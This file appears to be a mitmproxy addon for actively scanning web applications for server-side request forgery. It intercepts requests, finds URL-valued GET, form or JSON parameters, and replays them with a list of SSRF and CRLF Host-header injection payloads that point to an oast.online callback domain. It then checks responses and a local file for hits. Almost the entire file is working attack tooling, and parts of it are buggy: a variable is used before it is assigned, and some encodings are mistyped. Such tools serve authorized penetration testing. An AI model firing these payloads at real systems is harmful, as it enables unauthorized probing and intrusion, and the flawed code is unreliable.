from mitmproxy import http, ctx
from mitmproxy.io import FlowWriter
import copy
import os
import urllib.parse
import json
import random
import re
import time
from concurrent.futures import ThreadPoolExecutor

class AlterSSRF:
    def __init__(self):
        self.flow_dir_ssrf = "ssrf_flows"
        self.random_number = None
        self.oast_domain = "cn7n6s5iika08j97708gyph18nbgf99jc.oast.online"
        os.makedirs(self.flow_dir_ssrf, exist_ok=True)
        self.alteration_indicators_ssrf = [
            "{method}://{host}.{random_number}.{oast_domain}",
            "{method}://{host}@{random_number}.{oast_domain}",
            "{method}://{host}.{random_number}.{oast_domain}%00",
            "{random_number}.{oast_domain}",
            "%0AHost: {oast_domain}",
            "%20%0AHost: {oast_domain}",
            "%23%OAHost: {oast_domain}",
            "%E5%98%8A%E5%98%8DHost: {oast_domain}",
            "%0A%20Host: {oast_domain}",
            "%E5%98%8A%E5%98%8D%0AHost: {oast_domain}",
            "%3F%0AHost: {oast_domain}",
            "crlf%0AHost: {oast_domain}",
            "crlf%0A%20Host: {oast_domain}",
            "crlf%20%0AHost: {oast_domain}",
            "crlf%23%OAHost: {oast_domain}",
            "crlf%E5%98%8A%E5%98%8DHost: {oast_domain}",
            "crlf%E5%98%8A%E5%98%8D%0AHost: {oast_domain}",
        ]
        self.altered_header_ssrf = "x-altered-ssrf"

    def response(self, flow: http.HTTPFlow) -> None:
        self.host_found = None

        if self.altered_header_ssrf in flow.request.headers:
            self.check_altered_reflection_ssrf(flow)
            self.check_vulnerability(flow)
            return

        if flow.request.method == "GET":
            self.process_parameters_ssrf(flow, flow.request.query)
        elif flow.request.method == "POST":
            self.process_post_request_ssrf(flow)

    def process_post_request_ssrf(self, flow):

        content_type = flow.request.headers.get("Content-Type", "")
        if "application/x-www-form-urlencoded" in content_type:
            params = urllib.parse.parse_qs(flow.request.get_text())
            self.process_parameters_ssrf(flow, params)
        elif "application/json" in content_type:
            try:
                params = json.loads(flow.request.get_text())
                if isinstance(params, dict):
                    self.process_parameters_ssrf(flow, params)
            except json.JSONDecodeError:
                ctx.log.info("JSON decode error")

    def process_parameters_ssrf(self, flow, params):
        def process_value(param, value):
            
            if isinstance(value, str):
                self.escaped_value = value
                # Your existing logic for using escaped_value
            elif isinstance(value, list):
                # If the value is a list, process each item
                value = value[0]
                self.escaped_value = value
            elif isinstance(value, dict):
                # If the value is a dict, recursively process each key-value pair
                for key, val in value.items():
                    process_value(f"{param}[{key}]", val)  # Adjust the param name as needed
                    self.escaped_value = val
            else:
                # Optionally handle other non-string types or log them
                value = str(value)
                ctx.log.info(f"Unhandled value type for param '{param}': {type(value)}")
            
                # Define patterns to search for in the response body
            
            
            
        for param, value in params.items():

            process_value(param, value)

            url_pattern = r'\w+:\/\/[^\s]+'

            if re.search(url_pattern, self.escaped_value):
                ctx.log.info(f"second condition work")
                self.handle_reflection(flow, param, value)
            

    def handle_reflection(self, flow, param, value):
        with ThreadPoolExecutor(max_workers=100) as executor:


            self.random_number = str(random.randint(1000, 9999))
            for template in self.alteration_indicators_ssrf:
                if self.host_found:
                    break  # Stop if a vulnerability has already been found

                altered_value = template.format(host=flow.request.host, random_number=self.random_number, oast_domain=self.oast_domain, method=flow.request.scheme)
                altered_flow = self.alter_request_ssrf(flow, param, altered_value)

                if altered_flow:
                    if self.host_found:
                        return

                    ctx.master.commands.call("replay.client", [altered_flow])
                    # The response handling is now managed by the check_vulnerability method

    def alter_request_ssrf(self, original_flow, param, altered_value):
        new_request = copy.deepcopy(original_flow.request)
        if original_flow.request.method == "GET":
            new_request.query[param] = altered_value
        else:
            content_type = new_request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(new_request.get_text())
                params[param] = [altered_value]
                new_request.text = urllib.parse.urlencode(params, doseq=True)
            elif "application/json" in content_type:
                try:
                    body = json.loads(new_request.get_text())
                    if isinstance(body, dict):
                        body[param] = altered_value
                        new_request.text = json.dumps(body)
                except json.JSONDecodeError:
                    pass
        new_request.headers[self.altered_header_ssrf] = "true"
        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
        altered_flow.request = new_request
        return altered_flow

    def check_altered_reflection_ssrf(self, flow):
        for header, value in flow.response.headers.items():
            if "host" in header:
                ctx.log.info(f"SSRFwithCRlf Injection Detected: {flow.request.url}")
                self.save_flow_ssrf(flow, kind)
                return
        
        response_text = flow.response.get_text()
        redirect_patterns = [
            r'cj99fgbn81hpyg80779j80akii5s6n7nc',
        ]
        for pattern in redirect_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                kind = "regex"
                self.save_flow_ssrf(flow, kind)
                break
    


    def check_vulnerability(self, flow):
        host_with_random = f"{self.random_number}.{self.oast_domain}"

        # Checking external file
        try:
            with open('file.txt', 'r') as file:
                file_content = file.read()

            if host_with_random in file_content and not self.host_found:
                self.host_found = True
                kind = "byfile"
                self.save_flow_ssrf(flow, kind)
                ctx.log.info(f"External resource indicates potential RCE for host: {flow.request.host}")
        except IOError as e:
            ctx.log.error(f"Error reading file: {e}")

    def save_flow_ssrf(self, flow, kind):
        identifier = f"{kind}_{self.random_number}_{flow.request.method}_{flow.request.host}".replace("/", "_")
        filename = os.path.join(self.flow_dir_ssrf, f"{identifier}.mitm")
        try:
            with open(filename, "wb") as file:
                fw = FlowWriter(file)
                fw.add(flow)
            ctx.log.info(f"ssrf throught {kind} detected and saved in {filename}")
        except OSError as e:
            ctx.log.error(f"Error saving .mitm file: {e}")

addons = [AlterSSRF()]
